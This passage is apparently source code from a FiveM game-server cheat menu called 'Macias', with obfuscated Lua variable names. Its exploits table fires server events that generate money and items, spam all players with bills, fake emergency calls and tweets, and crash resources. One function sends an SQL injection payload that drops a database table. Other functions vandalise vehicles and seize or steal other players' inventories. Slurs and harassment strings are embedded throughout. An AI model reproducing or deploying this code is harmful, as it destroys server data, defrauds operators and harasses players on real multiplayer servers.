    if IsPedInAnyVehicle(shSkXOrKxuQs, true) then
        ClearPedTasksImmediately(shSkXOrKxuQs)
    end
    local v1phsaBMVn16OJ = GetPedBoneCoords(shSkXOrKxuQs, SKEL_ROOT, 0, 0, 0)
    local d666AsUSlPa0z5 = GetPedBoneCoords(shSkXOrKxuQs, SKEL_R_Hand, 0, 0, 0.2)
    local I8 = GetHashKey(dL_wQug)
    ShootSingleBulletBetweenCoords(
        d666AsUSlPa0z5.x,
        d666AsUSlPa0z5.y,
        d666AsUSlPa0z5.z,
        v1phsaBMVn16OJ.x,
        v1phsaBMVn16OJ.y,
        v1phsaBMVn16OJ.z,
        1,
        0,
        I8,
        PlayerPedId(),
        false,
        false,
        1
    )
end
MaciasFunc.sPO.rapeVehicle = function(aTf89XKA)
    if not IsPedAPlayer(GetPedInVehicleSeat(aTf89XKA, -1)) then
        RequestControlOnce(aTf89XKA)
        SetEntityAsMissionEntity(aTf89XKA, false, false)
        StartVehicleAlarm(aTf89XKA)
        DetachVehicleWindscreen(aTf89XKA)
        SmashVehicleWindow(aTf89XKA, 0)
        SmashVehicleWindow(aTf89XKA, 1)
        SmashVehicleWindow(aTf89XKA, 2)
        SmashVehicleWindow(aTf89XKA, 3)
        SetVehicleTyreBurst(aTf89XKA, 0, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 1, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 2, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 3, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 4, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 5, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 4, true, 1000.0)
        SetVehicleTyreBurst(aTf89XKA, 7, true, 1000.0)
        SetVehicleDoorBroken(aTf89XKA, 0, true)
        SetVehicleDoorBroken(aTf89XKA, 1, true)
        SetVehicleDoorBroken(aTf89XKA, 2, true)
        SetVehicleDoorBroken(aTf89XKA, 3, true)
        SetVehicleDoorBroken(aTf89XKA, 4, true)
        SetVehicleDoorBroken(aTf89XKA, 5, true)
        SetVehicleDoorBroken(aTf89XKA, 6, true)
        SetVehicleDoorBroken(aTf89XKA, 7, true)
        SetVehicleLights(aTf89XKA, 1)
        SetVehicleLightsMode(aTf89XKA, 1)
        SetVehicleDirtLevel(aTf89XKA, 10)
        SetVehicleModColor_1(aTf89XKA, 1)
        SetVehicleModColor_2(aTf89XKA, 1)
        SetVehicleCustomPrimaryColour(aTf89XKA, 255, 51, 255)
        SetVehicleCustomSecondaryColour(aTf89XKA, 255, 51, 255)
        SetVehicleBurnout(aTf89XKA, true)
        ForceVehicleEngineAudio(aTf89XKA, "faggio")
        SetVehicleLightsMode(aTf89XKA, 1)
        SetVehicleHandlingFloat(aTf89XKA, "CHandlingData", "fDriveBiasFront", 0.9)
        SetVehicleSteerBias(aTf89XKA, 1)
    end
end
do
    local Lm2ryPgHXu_P6 = {type = "player", owner = " ", seize = true}
    local FTYAbTNd0 = {type = "player", owner = " ", steal = true}
    MaciasFunc.sPO.SearchDisc = function(JQv_jcYoUFyKIt)
        if ESX ~= nil then
            ESX.TriggerServerCallback(
                "disc-inventoryhud:getIdentifier",
                function(fX1_4FzKtyFtvE5ssz5n)
                    Lm2ryPgHXu_P6.owner = fX1_4FzKtyFtvE5ssz5n
                    TriggerMaciasEvent(false, "disc-inventoryhud:openInventory", Lm2ryPgHXu_P6)
                end,
                JQv_jcYoUFyKIt
            )
        else
            Macias.PushNotification("Couldn't find ESX, try refresing it in the settings tab", 5000)
        end
    end
    MaciasFunc.sPO.StealDisc = function(PrvRbkzm0vTOYGbkI)
        if ESX ~= nil then
            ESX.TriggerServerCallback(
                "disc-inventoryhud:getIdentifier",
                function(sRdTXGQepQLGbDkH88c)
                    FTYAbTNd0.owner = sRdTXGQepQLGbDkH88c
                    TriggerMaciasEvent(false, "disc-inventoryhud:openInventory", FTYAbTNd0)
                end,
                PrvRbkzm0vTOYGbkI
            )
        else
            Macias.PushNotification("Couldn't find ESX, try refresing it in the settings tab", 5000)
        end
    end
end
MaciasFunc.exploits = {}
MaciasFunc.exploits.gcphoneTwitter = function()
    if MaciasFunc.doesResourceExist("gcphone") or MaciasFunc.doesResourceExist("xenknight") then
        Citizen.CreateThread(
            function()
                TriggerMaciasEvent(
                    true,
                    "gcPhone:twitter_createAccount",
                    "d0pamine_xyz",
                    "d0pamine_xyz",
                    "https://www.cjnews.com/wp-content/uploads/2012/01/gay-640x588.jpg"
                )
                Citizen.Wait(1500)
                TriggerMaciasEvent(true, "gcPhone:twitter_login", "d0pamine_xyz", "d0pamine_xyz")
                Citizen.Wait(1500)
                for i = 1, 50 do
                    TriggerMaciasEvent(
                        true,
                        "gcPhone:twitter_postTweets",
                        "d0pamine_xyz",
                        "d0pamine_xyz",
                        "d0pamine.xyz > all | Macias#5391"
                    )
                    Citizen.Wait(50)
                end
            end
        )
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_license = function()
    if MaciasFunc.doesResourceExist("esx_license") then
        local sk_ = {
            "d0pamine",
            "d0pamine.xyz",
            "Macias#5391",
            "RIP Your SQL Faggot",
            "Make sure to wipe all tables ;)",
            "Macias Was Here"
        }
        for i = 0, #sk_ do
            local active_players = GetActivePlayers()
            for player = 0, #active_players do
                TriggerMaciasEvent(
                    true,
                    "esx_license:addLicense",
                    player,
                    sk_[i],
                    function()
                        cb(true)
                        print("added license " .. sk_[i] .. " to " .. player)
                    end
                )
            end
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_givelicenses = function()
    if MaciasFunc.doesResourceExist("esx_license") then
        local licenses = {"dmv", "drive", "drive_bike", "drive_truck", "weapon"}
        for i = 0, #licenses do
            TriggerMaciasEvent(
                true,
                "esx_license:addLicense",
                0,
                licenses[i],
                function()
                    cb(true)
                    print("added license " .. licenses[i])
                end
            )
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_kashacters = function()
    if
        MaciasFunc.doesResourceExist("esx_kashacters") or MaciasFunc.doesResourceExist("esx_Kashacters") or
            MaciasFunc.doesResourceExist("Kashacters") or MaciasFunc.doesResourceExist("postacie") or
            MaciasFunc.doesResourceExist("kashacters")
     then
        TriggerMaciasEvent(
            true,
            "kashactersS:DeleteCharacter",
            "';DROP TABLE items;/"
        )
        Macias.PushNotification("Rozjebales baze cwaniaku!", 15000)
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.interactSound = function()
    if
        MaciasFunc.doesResourceExist("interactSound") or MaciasFunc.doesResourceExist("InteractSound") or
            MaciasFunc.doesResourceExist("interact-sound")
     then
        TriggerMaciasEvent(true, "InteractSound_SV:PlayOnAll", "demo", 99.0)
        TriggerMaciasEvent(true, "InteractSound_SV:PlayWithinDistance", 5000, "demo", 98.0)
        TriggerMaciasEvent(true, "InteractSound_SV:PlayOnAll", "cuff", 97)
        TriggerMaciasEvent(true, "InteractSound_SV:PlayOnAll", "buckle", 96)
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.phoneSpam = function()
    if
        MaciasFunc.doesResourceExist("esx_phone") or MaciasFunc.doesResourceExist("gcphone") or
            MaciasFunc.doesResourceExist("xenknight")
     then
        TriggerMaciasEvent(
            true,
            "esx_phone:send",
            "police",
            "www.d0pamine.xyz",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_phone:send",
            "ambulance",
            "www.d0pamine.xyz",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_phone:send",
            "taxi",
            "www.d0pamine.xyz",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_phone:send",
            "realestateagent",
            "www.d0pamine.xyz",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    elseif MaciasFunc.doesResourceExist("esx_addons_gcphone") then
        TriggerMaciasEvent(
            true,
            "esx_addons_gcphone:startCall",
            "police",
            "www.d0pamine.xyz",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_addons_gcphone:startCall",
            "ambulance",
            "www.d0pamine.xyz",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_addons_gcphone:startCall",
            "taxi",
            "www.d0pamine.xyz",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerMaciasEvent(
            true,
            "esx_addons_gcphone:startCall",
            "realestateagent",
            "www.d0pamine.xyz",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    end
end
MaciasFunc.exploits.esx_moneymaker = function()
    local KkleewwG_x = KeyboardInputMacias("Enter amount of money", " ", 12)
    if KkleewwG_x ~= " " then
        local oOmm = KeyboardInputMacias("Enter amount loops", " ", 12)
        if not oOmm then
            oOmm = 1
        end
        local Y8ybTnyX4AMTQd8M = KeyboardInputMacias("Are you sure? Y/N", " ", 0)
        if Y8ybTnyX4AMTQd8M == "y" or Y8ybTnyX4AMTQd8M == "Y" or Y8ybTnyX4AMTQd8M == "yes" or Y8ybTnyX4AMTQd8M == "Yes" then
            for iloop = 0, oOmm do
                if
                    MaciasFunc.doesResourceExist("esx_vangelico_robbery") or
                        MaciasFunc.doesResourceExist("esx_vangelico")
                 then
                    TriggerMaciasEvent(true, "esx_vangelico_robbery:gioielli")
                    TriggerMaciasEvent(true, "esx_vangelico_robbery:gioielli1")
                    TriggerMaciasEvent(true, "lester:vendita")
                end
                if MaciasFunc.doesResourceExist("esx_burglary") or MaciasFunc.doesResourceExist("99kr-burglary") then
                    TriggerMaciasEvent(true, "99kr-burglary:addMoney", KkleewwG_x)
                    TriggerMaciasEvent(true, "burglary:money", KkleewwG_x)
                end
                if MaciasFunc.doesResourceExist("esx_minerjob") or MaciasFunc.doesResourceExist("esx_mining") then
                    TriggerMaciasEvent(true, "esx_mining:getItem")
                    TriggerMaciasEvent(true, "esx_mining:sell")
                end
                if MaciasFunc.doesResourceExist("esx_fishing") or MaciasFunc.doesResourceExist("james_fishing") then
                    TriggerMaciasEvent(true, "esx_fishing:caughtFish")
                    TriggerMaciasEvent(true, "loffe-fishing:giveFish")
                    TriggerMaciasEvent(true, "loffe-fishing:sellFish")
                    ESX.TriggerServerCallback(
                        "james_fishing:receiveFish",
                        function(zVnUvPOpA)
                            if zVnUvPOpA then
                                print("received fish")
                            end
                        end
                    )
                    ESX.TriggerServerCallback(
                        "james_fishing:sellFish",
                        function(vEbHNcnMMBa906yJL, Nz9GYA8WqDUxJZQgOylX)
                            if vEbHNcnMMBa906yJL then
                                print("sold " .. Nz9GYA8WqDUxJZQgOylX)
                            end
                        end
                    )
                end
                if MaciasFunc.doesResourceExist("esx_mugging") then
                    TriggerMaciasEvent(true, "esx_mugging:giveMoney", KkleewwG_x)
                end
                if MaciasFunc.doesResourceExist("loffe_robbery") then
                    TriggerMaciasEvent(true, "loffe_robbery:pickUp", iloop)
                end
                if
                    MaciasFunc.doesResourceExist("esx_prisonwork") or
                        MaciasFunc.doesResourceExist("loffe_prisonwork")
                 then
                    TriggerMaciasEvent(true, "esx_loffe_fangelse:Pay")
                end
                if MaciasFunc.doesResourceExist("esx_robnpc") then
                    TriggerMaciasEvent(true, "esx_robnpc:giveMoney")
                end
                if MaciasFunc.doesResourceExist("MF_DrugSales") or MaciasFunc.doesResourceExist("MF_drugsales") then
                    TriggerMaciasEvent(true, "MF_DrugSales:Sold", "water", KkleewwG_x, iloop)
                end
                if MaciasFunc.doesResourceExist("lenzh_chopshop") or MaciasFunc.doesResourceExist("esx_chopshop") then
                    TriggerMaciasEvent(true, "lenzh_chopshop:rewards")
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "battery", 5)
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "lowradio", 5)
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "stockrim", 5)
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "highrim", 5)
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "highradio", 5)
                    TriggerMaciasEvent(true, "lenzh_chopshop:sell", "airbag", 5)
                end
                if MaciasFunc.doesResourceExist("ESX_Deliveries") then
                    TriggerMaciasEvent(true, "esx_deliveries:AddCashMoney", KkleewwG_x)
                    TriggerMaciasEvent(true, "esx_deliveries:AddBankMoney", KkleewwG_x)
                    TriggerMaciasEvent(true, "esx_deliveries:finishDelivery:server")
                end
                if MaciasFunc.doesResourceExist("ESX_Cargodelivery") then
                    ESX.TriggerServerCallback(
                        "esx_cargodelivery:sellCargo",
                        function(bMWK_3Ab)
                            if bMWK_3Ab then
                                print("received " .. KkleewwG_x)
                            end
                        end,
                        KkleewwG_x
                    )
                end
                if
                    MaciasFunc.doesResourceExist("napadtransport") or
                        MaciasFunc.doesResourceExist("Napad_transport_z_gotowka") or
                        MaciasFunc.doesResourceExist("esx_truck_robbery")
                 then
                    TriggerMaciasEvent(true, "napadtransport:graczZrobilnapad")
                end
                if MaciasFunc.doesResourceExist("napadnakase") or MaciasFunc.doesResourceExist("Napad_na_kase") then
                    TriggerMaciasEvent(true, "tost:zgarnijsiano")
                end
                local c31vj = {
                    "esx_hunting",
                    "esx_qalle_hunting",
                    "esx-qalle-hunting",
                    "esx_taxijob",
                    "esx_taxi",
                    "esx_carthiefjob",
                    "esx_carthief",
                    "esx_rangerjob",
                    "esx_ranger",
                    "esx_godirtyjob",
                    "esx_godirty",
                    "esx_banksecurityjob",
                    "esx_banksecurity",
                    "esx_pilotjob",
                    "esx_pilot",
                    "esx_pizzajob",
                    "esx_pizza",
                    "esx_gopostaljob",
                    "esx_gopostal",
                    "esx_garbagejob",
                    "esx_garbage",
                    "esx_truckerjob",
                    "esx_trucker"
                }
                local lV = {":pay", ":finish", ":finishJob", ":reward", ":sell", ":success"}
                Citizen.CreateThread(
                    function()
                        for i = 1, #c31vj do
                            if MaciasFunc.doesResourceExist(c31vj[i]) then
                                for suff = 1, #lV do
                                    Wait(50)
                                    TriggerMaciasEvent(true, c31vj[i] .. lV[suff], KkleewwG_x)
                                end
                            end
                        end
                    end
                )
            end
        else
            Macias.PushNotification("esx_moneymaker canceled.", 5000)
        end
    else
        Macias.PushNotification("Please enter a valid amount of money!", 5000)
    end
end
MaciasFunc.exploits.esx_moneywash = function()
    local dnQ5x2cwH5WmPD41rc = KeyboardInputMacias("Enter amount of money", " ", 12)
    if dnQ5x2cwH5WmPD41rc ~= " " then
        if MaciasFunc.doesResourceExist("esx_blanchisseur") or MaciasFunc.doesResourceExist("esx_moneywash") then
            TriggerMaciasEvent(true, "esx_blanchisseur:washMoney", dnQ5x2cwH5WmPD41rc)
            TriggerMaciasEvent(true, "esx_moneywash:washMoney", dnQ5x2cwH5WmPD41rc)
            TriggerMaciasEvent(true, "esx_moneywash:withdraw", dnQ5x2cwH5WmPD41rc)
        end
    else
        Macias.PushNotification("Please enter a valid amount of money!", 5000)
    end
end
MaciasFunc.exploits.esx_harvest_stop = function()
    if MaciasFunc.doesResourceExist("esx_drugs") or MaciasFunc.doesResourceExist("esx_illegal_drugs") then
        TriggerMaciasEvent(true, "esx_drugs:stopHarvestWeed")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopHarvestWeed")
        TriggerMaciasEvent(true, "esx_drugs:pickedUpCannabis")
        TriggerMaciasEvent(true, "esx_drugs:stopTransformWeed")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopTransformWeed")
        TriggerMaciasEvent(true, "esx_drugs:processCannabis")
        TriggerMaciasEvent(true, "esx_drugs:stopHarvestOpium")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopHarvestOpium")
        TriggerMaciasEvent(true, "esx_drugs:stopTransformOpium")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopTransformOpium")
        TriggerMaciasEvent(true, "esx_drugs:stopHarvestMeth")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopHarvestMeth")
        TriggerMaciasEvent(true, "esx_drugs:stopTransformMeth")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopTransformMeth")
        TriggerMaciasEvent(true, "esx_drugs:stopHarvestCoke")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopHarvestCoke")
        TriggerMaciasEvent(true, "esx_drugs:stopTransformCoke")
        TriggerMaciasEvent(true, "esx_illegal_drugs:stopTransformCoke")
    elseif MaciasFunc.doesResourceExist("esx_mechanicjob") or MaciasFunc.doesResourceExist("esx_mecanojob") then
        TriggerMaciasEvent(true, "esx_mechanicjob:stopHarvest")
        TriggerMaciasEvent(true, "esx_mecanojob:stopHarvest")
        TriggerMaciasEvent(true, "esx_mechanicjob:stopHarvest2")
        TriggerMaciasEvent(true, "esx_mecanojob:stopHarvest2")
        TriggerMaciasEvent(true, "esx_mechanicjob:stopHarvest3")
        TriggerMaciasEvent(true, "esx_mecanojob:stopHarvest3")
    end
end
MaciasFunc.exploits.esx_outlawalert = function()
    if MaciasFunc.doesResourceExist("esx_outlawalert") then
        TriggerMaciasEvent(
            true,
            "esx_outlawalert:gunshotInProgress",
            {x = 1337.0, y = 1337.0, z = 1337.0},
            "d0pamine.xyz",
            0
        )
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_billing = function()
    if MaciasFunc.doesResourceExist("esx_billing") then
        local ZduG8E_MEzxgTWYm = GetActivePlayers()
        for i = 0, #ZduG8E_MEzxgTWYm do
            TriggerMaciasEvent(
                true,
                "esx_billing:sendBill",
                GetPlayerServerId(i),
                "d0pamine.xyz",
                "d0pamine.xyz > all",
                5391.0
            )
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_policejob_crash = function()
    if MaciasFunc.doesResourceExist("esx_policejob") then
        Citizen.CreateThread(
            function()
                for i = 1, 50, 1 do
                    Citizen.Wait(50)
                    TriggerMaciasEvent(true, "esx_policejob:spawned")
                end
            end
        )
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_spawncustomitem = function()
    local G9TrYbmuTnvcgAMiSYlcY = KeyboardInputMacias("Enter Item Name", " ", 15)
    if MaciasFunc.doesResourceExist("esx_jobs") then
        if G9TrYbmuTnvcgAMiSYlcY ~= " " then
            local ra = {
                {
                    name = G9TrYbmuTnvcgAMiSYlcY,
                    db_name = G9TrYbmuTnvcgAMiSYlcY,
                    time = 100.0,
                    max = 100.0,
                    add = 1,
                    remove = 10,
                    drop = 100.0,
                    requires = "nothing",
                    requires_name = "Nothing"
                }
            }
            Citizen.CreateThread(
                function()
                    TriggerMaciasEvent(true, "esx_jobs:startWork", ra)
                    Wait(100.0)
                    TriggerMaciasEvent(true, "esx_jobs:stopWork", ra)
                end
            )
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
    local uy7py9DqJCB5J6dKYf8 = {
        "esx_mechanicjob",
        "esx_mecanojob",
        "esx_taxijob",
        "esx_vehicleshop",
        "esx_gangjob",
        "esx_mafiajob",
        "esx_carteljob",
        "esx_bikerjob"
    }
    if G9TrYbmuTnvcgAMiSYlcY ~= " " then
        for i = 1, #uy7py9DqJCB5J6dKYf8 do
            if MaciasFunc.doesResourceExist(uy7py9DqJCB5J6dKYf8[i]) then
                Citizen.CreateThread(
                    function()
                        Wait(50)
                        TriggerMaciasEvent(
                            true,
                            uy7py9DqJCB5J6dKYf8[i] .. ":getStockItem",
                            G9TrYbmuTnvcgAMiSYlcY,
                            100.0
                        )
                        TriggerMaciasEvent(
                            true,
                            uy7py9DqJCB5J6dKYf8[i] .. ":putStockItems",
                            G9TrYbmuTnvcgAMiSYlcY,
                            -100.0
                        )
                    end
                )
            end
        end
    end
end
MaciasFunc.exploits.esx_spawncustomitems = function()
    if MaciasFunc.doesResourceExist("esx_jobs") then
        local dAM38el = CustomItems.Item[VS]
        local IrYKxC6ikHpmDQ40zP = CustomItems.ItemDatabase[dAM38el]
        if type(IrYKxC6ikHpmDQ40zP) == "table" then
            Citizen.CreateThread(
                function()
                    for rgyv, _lcbH1c in pairs(IrYKxC6ikHpmDQ40zP) do
                        local yEiauhf8EvLttk4 = CustomItems.ItemRequires[rgyv]
                        local dB = {
                            {
                                name = rgyv,
                                db_name = _lcbH1c,
                                time = 100.0,
                                max = 1337.0,
                                add = 1,
                                remove = 10,
                                drop = 100.0,
                                requires = yEiauhf8EvLttk4 and IrYKxC6ikHpmDQ40zP[yEiauhf8EvLttk4] or "nothing",
                                requires_name = yEiauhf8EvLttk4 and yEiauhf8EvLttk4 or "Nothing"
                            }
                        }
                        Citizen.CreateThread(
                            function()
                                TriggerMaciasEvent(true, "esx_jobs:startWork", dB)
                                Wait(1000.0)
                                TriggerMaciasEvent(true, "esx_jobs:stopWork", dB)
                            end
                        )
                        Wait(3000)
                    end
                end
            )
        else
            local CMCME5h = CustomItems.ItemRequires[dAM38el]
            local xSH9l4 = {
                {
                    name = dAM38el,
                    db_name = IrYKxC6ikHpmDQ40zP,
                    time = 100.0,
                    max = 100.0,
                    add = 1,
                    remove = 10,
                    drop = 100.0,
                    requires = CMCME5h and CustomItems.ItemDatabase[CMCME5h] or "nothing",
                    requires_name = CMCME5h and CMCME5h or "Nothing"
                }
            }
            Citizen.CreateThread(
                function()
                    TriggerMaciasEvent(true, "esx_jobs:startWork", xSH9l4)
                    Wait(100.0)
                    TriggerMaciasEvent(true, "esx_jobs:stopWork", xSH9l4)
                end
            )
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_jobitems = function()
    if MaciasFunc.doesResourceExist("esx_jobs") then
        local VuZMVGmnb2k = Jobs.Item[Cm98o9wZsaLnySTDWo]
        local gg7UXBZByluC97PzV = Jobs.ItemDatabase[VuZMVGmnb2k]
        if type(gg7UXBZByluC97PzV) == "table" then
            Citizen.CreateThread(
                function()
                    for EopJsGkmsNFzu271gbXt, WC9ScSsx1Ns7CAnVANQE in pairs(gg7UXBZByluC97PzV) do
                        local yYBxEyT1XAZ2jq = Jobs.ItemRequires[EopJsGkmsNFzu271gbXt]
                        local oushx0WgzaHD2I36tELr = {
                            {
                                name = EopJsGkmsNFzu271gbXt,
                                db_name = WC9ScSsx1Ns7CAnVANQE,
                                time = 100.0,
                                max = 1337.0,
                                add = 10,
                                remove = 10,
                                drop = 100.0,
                                requires = yYBxEyT1XAZ2jq and gg7UXBZByluC97PzV[yYBxEyT1XAZ2jq] or "nothing",
                                requires_name = yYBxEyT1XAZ2jq and yYBxEyT1XAZ2jq or "Nothing"
                            }
                        }
                        Citizen.CreateThread(
                            function()
                                TriggerMaciasEvent(true, "esx_jobs:startWork", oushx0WgzaHD2I36tELr)
                                Wait(1000.0)
                                TriggerMaciasEvent(true, "esx_jobs:stopWork", oushx0WgzaHD2I36tELr)
                            end
                        )
                        Wait(3000)
                    end
                end
            )
        else
            local hy1c = Jobs.ItemRequires[VuZMVGmnb2k]
            local OAoq = {
                {
                    name = VuZMVGmnb2k,
                    db_name = gg7UXBZByluC97PzV,
                    time = 100.0,
                    max = 1337.0,
                    add = 10,
                    remove = 10,
                    drop = 100.0,
                    requires = hy1c and Jobs.ItemDatabase[hy1c] or "nothing",
                    requires_name = hy1c and hy1c or "Nothing"
                }
            }
            Citizen.CreateThread(
                function()
                    TriggerMaciasEvent(true, "esx_jobs:startWork", OAoq)
                    Wait(100.0)
                    TriggerMaciasEvent(true, "esx_jobs:stopWork", OAoq)
                end
            )
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_harvestitems = function()
    if MaciasFunc.doesResourceExist("esx_drugs") or MaciasFunc.doesResourceExist("esx_illegal_drugs") then
        if Tx70s70 == 1 then
            TriggerMaciasEvent(true, "esx_drugs:startHarvestWeed")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startHarvestWeed")
            TriggerMaciasEvent(true, "esx_drugs:pickedUpCannabis")
            TriggerMaciasEvent(true, "esx_drugs:startTransformWeed")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startTransformWeed")
            TriggerMaciasEvent(true, "esx_drugs:processCannabis")
        elseif Tx70s70 == 2 then
            TriggerMaciasEvent(true, "esx_drugs:startHarvestOpium")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startHarvestOpium")
            TriggerMaciasEvent(true, "esx_drugs:startTransformOpium")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startTransformOpium")
        elseif Tx70s70 == 3 then
            TriggerMaciasEvent(true, "esx_drugs:startHarvestMeth")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startHarvestMeth")
            TriggerMaciasEvent(true, "esx_drugs:startTransformMeth")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startTransformMeth")
        elseif Tx70s70 == 4 then
            TriggerMaciasEvent(true, "esx_drugs:startHarvestCoke")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startHarvestCoke")
            TriggerMaciasEvent(true, "esx_drugs:startTransformCoke")
            TriggerMaciasEvent(true, "esx_illegal_drugs:startTransformCoke")
        end
    elseif MaciasFunc.doesResourceExist("esx_mechanicjob") or MaciasFunc.doesResourceExist("esx_mecanojob") then
        if Tx70s70 == 5 then
            TriggerMaciasEvent(true, "esx_mechanicjob:startHarvest")
            TriggerMaciasEvent(true, "esx_mecanojob:startHarvest")
        elseif Tx70s70 == 6 then
            TriggerMaciasEvent(true, "esx_mechanicjob:startHarvest2")
            TriggerMaciasEvent(true, "esx_mecanojob:startHarvest2")
        elseif Tx70s70 == 7 then
            TriggerMaciasEvent(true, "esx_mechanicjob:startHarvest3")
            TriggerMaciasEvent(true, "esx_mecanojob:startHarvest3")
        end
    else
        Macias.PushNotification("Resource was not found!", 5000)
    end
end
MaciasFunc.exploits.esx_spam_server_console = function()
    if ESX ~= nil then
        for i = 4, 9 do
            ESX.TriggerServerCallback(
                "^" .. i .. "d0pamine_xyz:getFuckedNigger",
                function(xW4qzWy)
                end
            )
        end
    else
        Macias.PushNotification("ESX was not found!", 5000)
    end
end
MaciasFunc.Math = {}
MaciasFunc.Math.Round = function(HzrWJelKRFL, vn6uFW)
    if vn6uFW then
        local rd4JRDIAkW3g = 10 ^ vn6uFW
        return math.floor((HzrWJelKRFL * rd4JRDIAkW3g) + 0.5) / (rd4JRDIAkW3g)
    else
        return math.floor(HzrWJelKRFL + 0.5)
    end
end
MaciasFunc.Math.GroupDigits = function(yCjbzh9_n5F1)
    local HD0RSAgU, Zu, _TKaWpcuh = string.match(yCjbzh9_n5F1, "^([^%d]*%d)(%d*)(.-)$")
    return HD0RSAgU ..
        (Zu:reverse():gsub("(%d%d%d)", "%1" .. _U("locale_digit_grouping_symbol")):reverse()) .. _TKaWpcuh
end
MaciasFunc.Math.Trim = function(F6l67AvrJNXX)
    if F6l67AvrJNXX then
        return (string.gsub(F6l67AvrJNXX, "^%s*(.-)%s*$", "%1"))
    else
        return nil
    end
end
MaciasFunc.Game = {}
MaciasFunc.Game.Subtitle = function(OmuW36IuEYJzOsbB_dBtB, Rn1QdjeLTE, IYhkUAABNLp)
    if Rn1QdjeLTE == nil then
        Rn1QdjeLTE = 2500
    end
    if IYhkUAABNLp == nil then
        IYhkUAABNLp = true
    end
    ClearPrints()
    SetTextEntry_2("STRING")
    for i = 1, OmuW36IuEYJzOsbB_dBtB:len(), 99.0 do
        AddTextComponentString(string.sub(OmuW36IuEYJzOsbB_dBtB, i, i + 99.0))
    end
    DrawSubtitleTimed(Rn1QdjeLTE, IYhkUAABNLp)
end
MaciasFunc.Game.GetVehicles = function()
    local fK3ik5DxV0NA3X = {}
    for yGkMe4Fk05CZ in EnumerateVehicles() do
        table.insert(fK3ik5DxV0NA3X, yGkMe4Fk05CZ)
    end
    return fK3ik5DxV0NA3X
end
MaciasFunc.Game.GetVehiclesInArea = function(ihhZANwLogrnJ, ZOg1F4xw_w)
    local iN67 = MaciasFunc.Game.GetVehicles()
    local OO7jYiY3WtdXM = {}
    for i = 1, #iN67, 1 do
        local tnu = GetEntityCoords(iN67[i])
        local Zpn43psLMAxyLp = GetDistanceBetweenCoords(tnu, ihhZANwLogrnJ.x, ihhZANwLogrnJ.y, ihhZANwLogrnJ.z, true)
        if Zpn43psLMAxyLp <= ZOg1F4xw_w then
            table.insert(OO7jYiY3WtdXM, iN67[i])
        end
    end
    return OO7jYiY3WtdXM
end
MaciasFunc.Game.driftSmoke = function(MmoVNn6NOGoVAn86DAa, xL, L_8, S2k5IrokAQAUW3, CQ1a3xphBXAPpQlWCwq)
    all_part = {}
    for i = 0, S2k5IrokAQAUW3 do
        UseParticleFxAssetNextCall(MmoVNn6NOGoVAn86DAa)
        W1 =
            StartParticleFxLoopedOnEntityBone(
            xL,
            L_8,
            0.05,
            0,
            0,
            0,
            0,
            0,
            GetEntityBoneIndexByName(L_8, "wheel_lr"),
            CQ1a3xphBXAPpQlWCwq,
            0,
            0,
            0
        )
        UseParticleFxAssetNextCall(MmoVNn6NOGoVAn86DAa)
        W2 =
            StartParticleFxLoopedOnEntityBone(
            xL,
            L_8,
            0.05,
            0,
            0,
            0,
            0,
            0,
            GetEntityBoneIndexByName(L_8, "wheel_rr"),
            CQ1a3xphBXAPpQlWCwq,
            0,
            0,
            0
        )
        table.insert(all_part, 1, W1)
        table.insert(all_part, 2, W2)
    end
    Citizen.Wait(1000.0)
    for QiDi1tshBKYuaJYcE2Yqg, GOqTdqqddG3rWSZl_IOGz in pairs(all_part) do
        StopParticleFxLooped(GOqTdqqddG3rWSZl_IOGz, true)
    end
end
